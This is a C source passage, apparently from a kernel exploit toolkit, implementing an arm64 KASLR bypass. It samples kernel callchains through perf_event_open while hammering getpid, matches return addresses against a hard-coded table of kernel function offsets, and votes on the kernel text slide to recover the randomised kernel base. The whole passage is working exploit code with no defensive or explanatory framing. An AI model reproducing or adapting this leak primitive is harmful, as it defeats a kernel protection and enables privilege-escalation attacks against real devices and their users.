 * (gen_anchors.py 用 llvm-objdump 从 kernel.elf 提取) */
static const struct perf_anchor perf_anchors[] = {
  {0x010034ULL, "gic_handle_irq"},
  {0x010060ULL, "gic_handle_irq"},
  {0x01006cULL, "gic_handle_irq"},
  {0x010074ULL, "gic_handle_irq"},
  {0x010094ULL, "gic_handle_irq"},
  {0x010144ULL, "gic_handle_irq"},
  {0x010194ULL, "gic_handle_irq"},
  {0x02cfc0ULL, "do_el0_svc"},
  {0x02d08cULL, "el0_svc_common"},
  {0x02d0a4ULL, "el0_svc_common"},
  {0x02d0d0ULL, "el0_svc_common"},
  {0x02d0f8ULL, "el0_svc_common"},
  {0x02d190ULL, "invoke_syscall"},
  {0x02d1d8ULL, "invoke_syscall"},
  {0x02d1e4ULL, "invoke_syscall"},
  {0x02d228ULL, "invoke_syscall"},
  {0x1869f4ULL, "hrtimer_interrupt"},
  {0x186a1cULL, "hrtimer_interrupt"},
  {0x186a6cULL, "hrtimer_interrupt"},
  {0x186a80ULL, "hrtimer_interrupt"},
  {0x186a88ULL, "hrtimer_interrupt"},
  {0x186aa8ULL, "hrtimer_interrupt"},
  {0x186ab4ULL, "hrtimer_interrupt"},
  {0x186ac0ULL, "hrtimer_interrupt"},
  {0x186ad8ULL, "hrtimer_interrupt"},
  {0x186b38ULL, "hrtimer_interrupt"},
  {0x186b4cULL, "hrtimer_interrupt"},
  {0x186b54ULL, "hrtimer_interrupt"},
  {0x186b74ULL, "hrtimer_interrupt"},
  {0x186b80ULL, "hrtimer_interrupt"},
  {0x186b8cULL, "hrtimer_interrupt"},
  {0x186ba4ULL, "hrtimer_interrupt"},
  {0x186c04ULL, "hrtimer_interrupt"},
  {0x186c18ULL, "hrtimer_interrupt"},
  {0x186c20ULL, "hrtimer_interrupt"},
  {0x186c40ULL, "hrtimer_interrupt"},
  {0x186c4cULL, "hrtimer_interrupt"},
  {0x186c58ULL, "hrtimer_interrupt"},
  {0x186c70ULL, "hrtimer_interrupt"},
  {0x186cbcULL, "hrtimer_interrupt"},
  {0x186cf0ULL, "hrtimer_interrupt"},
  {0x186d10ULL, "hrtimer_interrupt"},
  {0x186e38ULL, "__hrtimer_run_queues"},
  {0x186e68ULL, "__hrtimer_run_queues"},
  {0x186e8cULL, "__hrtimer_run_queues"},
  {0x186e9cULL, "__hrtimer_run_queues"},
  {0x186eb8ULL, "__hrtimer_run_queues"},
  {0x186f40ULL, "__hrtimer_run_queues"},
  {0x186f60ULL, "__hrtimer_run_queues"},
  {0x186fb0ULL, "__hrtimer_run_queues"},
  {0x186fd4ULL, "__hrtimer_run_queues"},
  {0x187020ULL, "__hrtimer_run_queues"},
  {0x187044ULL, "__hrtimer_run_queues"},
  {0x187084ULL, "__hrtimer_run_queues"},
  {0xff6190ULL, "el0_svc"},
  {0xff6198ULL, "el0_svc"},
  {0xff61b8ULL, "el0_svc"},
  {0xff61d0ULL, "el0_svc"},
};

#define PERF_ANCHOR_COUNT (int)(sizeof(perf_anchors) / sizeof(perf_anchors[0]))
#define PERF_LEAK_RING_PAGES 32
#define PERF_LEAK_SLIDE_ALIGN 0x200000ULL
#define PERF_LEAK_SLIDE_MAX 0x400000000ULL
#define PERF_LEAK_STORM_ITER 200000
#define PERF_LEAK_MAX_CHAIN 128
#define PERF_LEAK_MAX_VOTES 16

struct perf_slide_vote {
  uint64_t slide;
  int votes;
  uint64_t anchor_mask;
};

static void perf_vote_slide(struct perf_slide_vote *votes, int max_votes,
                            uint64_t slide, int anchor_idx) {
  for (int i = 0; i < max_votes; i++) {
    if (votes[i].votes == 0) {
      votes[i].slide = slide;
      votes[i].votes = 1;
      votes[i].anchor_mask = 1ULL << anchor_idx;
      return;
    }
    if (votes[i].slide == slide) {
      votes[i].votes++;
      votes[i].anchor_mask |= 1ULL << anchor_idx;
      return;
    }
  }
}

static int perf_popcount64(uint64_t v) {
  int n = 0;
  while (v) {
    v &= v - 1;
    n++;
  }
  return n;
}

uint64_t perf_leak_text_base(void) {
  int pfd = open("/proc/sys/kernel/perf_event_paranoid", O_RDONLY | O_CLOEXEC);
  if (pfd >= 0) {
    char pbuf[16];
    ssize_t pn = read(pfd, pbuf, sizeof(pbuf) - 1);
    close(pfd);
    if (pn > 0) {
      pbuf[pn] = 0;
      if (atoi(pbuf) > 1) {
        pr_warning("perf text-base perf_event_paranoid too high\n");
        return 0;
      }
    }
  }

  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.size = sizeof(pe);
  pe.sample_period = 20000;
  pe.sample_type = PERF_SAMPLE_CALLCHAIN;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.disabled = 1;
  pe.wakeup_events = 1;

  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) {
    pe.sample_period = 100000;
    fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  }
  if (fd < 0) {
    pe.sample_period = 1000000;
    fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  }
  if (fd < 0) {
    pr_warning("perf text-base perf_event_open errno=%d\n", errno);
    return 0;
  }

  size_t mmap_size =
      (size_t)(1 + PERF_LEAK_RING_PAGES) * (size_t)PAGE_SIZE;
  void *mmap_buf = mmap(NULL, mmap_size, PROT_READ | PROT_WRITE,
                         MAP_SHARED, fd, 0);
  if (mmap_buf == MAP_FAILED) {
    pr_warning("perf text-base mmap errno=%d\n", errno);
    close(fd);
    return 0;
  }

  struct perf_event_mmap_page *header =
      (struct perf_event_mmap_page *)mmap_buf;

  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);

  /* 定时器只在内核态打断我们(exclude_user=1) → 命中的必然是
   * getpid 系统调用路径,callchain 全是锚点函数的返回点 */
  for (volatile long i = 0; i < PERF_LEAK_STORM_ITER; i++) {
    syscall(__NR_getpid);
  }

  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

  uint64_t head = header->data_head;
  __sync_synchronize();
  uint64_t size = (uint64_t)PERF_LEAK_RING_PAGES * (uint64_t)PAGE_SIZE;
  uint64_t tail = header->data_tail;
  if (head > tail + size) {
    /* 环形缓冲回绕:只保留最后一个窗口 */
    tail = head - size;
  }
  uint8_t *data = (uint8_t *)mmap_buf + PAGE_SIZE;

  struct perf_slide_vote votes[PERF_LEAK_MAX_VOTES];
  memset(votes, 0, sizeof(votes));
  int samples = 0;
  int kernel_samples = 0;
  int frames = 0;
  int max_chain = 0;
  int zero_slide_hits = 0;

  while (tail + 8 <= head) {
    struct perf_event_header *ev =
        (struct perf_event_header *)(data + (tail % size));
    uint16_t esz = ev->size;
    if (esz < 8 || (esz & 7) || tail + esz > head) {
      break;
    }
    if (ev->type == PERF_RECORD_SAMPLE) {
      samples++;
      if (ev->misc & PERF_RECORD_MISC_KERNEL) {
        kernel_samples++;
      }
      /* sample_type = CALLCHAIN only: header + u64 nr + nr*u64 ips */
      const uint64_t *body = (const uint64_t *)((uint8_t *)ev + sizeof(*ev));
      uint64_t nr = body[0];
      if (nr > 0 && nr <= PERF_LEAK_MAX_CHAIN) {
        if ((int)nr > max_chain) {
          max_chain = (int)nr;
        }
        for (uint64_t k = 0; k < nr; k++) {
          uint64_t ip = body[1 + k];
          frames++;
          for (int a = 0; a < PERF_ANCHOR_COUNT; a++) {
            uint64_t slide =
                ip - KIMAGE_TEXT_BASE - perf_anchors[a].rva;
            if (slide == 0) {
              zero_slide_hits++;
              continue;
            }
            if (slide >= PERF_LEAK_SLIDE_MAX ||
                (slide & (PERF_LEAK_SLIDE_ALIGN - 1)) != 0) {
              continue;
            }
            perf_vote_slide(votes, PERF_LEAK_MAX_VOTES, slide, a);
          }
        }
      }
    }
    tail += esz;
  }
  header->data_tail = tail;

  munmap(mmap_buf, mmap_size);
  close(fd);

  if (samples == 0) {
    pr_warning("perf text-base no samples (max_chain=%d)\n", max_chain);
    return 0;
  }

  int best = -1;
  for (int i = 0; i < PERF_LEAK_MAX_VOTES; i++) {
    if (votes[i].votes == 0) {
      continue;
    }
    pr_info("perf slide-candidate slide=%016llx votes=%d anchors=%d\n",
            (unsigned long long)votes[i].slide, votes[i].votes,
            perf_popcount64(votes[i].anchor_mask));
    if (best < 0 || votes[i].votes > votes[best].votes) {
      best = i;
    }
  }

  if (best < 0 || votes[best].votes < 3 ||
      perf_popcount64(votes[best].anchor_mask) < 2) {
    pr_warning("perf text-base no reliable slide: samples=%d "
               "kernel=%d frames=%d max_chain=%d zero_slide_hits=%d\n",
               samples, kernel_samples, frames, max_chain, zero_slide_hits);
    return 0;
  }

  uint64_t text_base = KIMAGE_TEXT_BASE + votes[best].slide;
  pr_success("perf text-base pid=%d samples=%d kernel=%d frames=%d "
             "max_chain=%d slide=%016llx votes=%d anchors=%d base=%016llx\n",
             getpid(), samples, kernel_samples, frames, max_chain,
             (unsigned long long)votes[best].slide, votes[best].votes,
             perf_popcount64(votes[best].anchor_mask),
             (unsigned long long)text_base);
  return text_base;
}
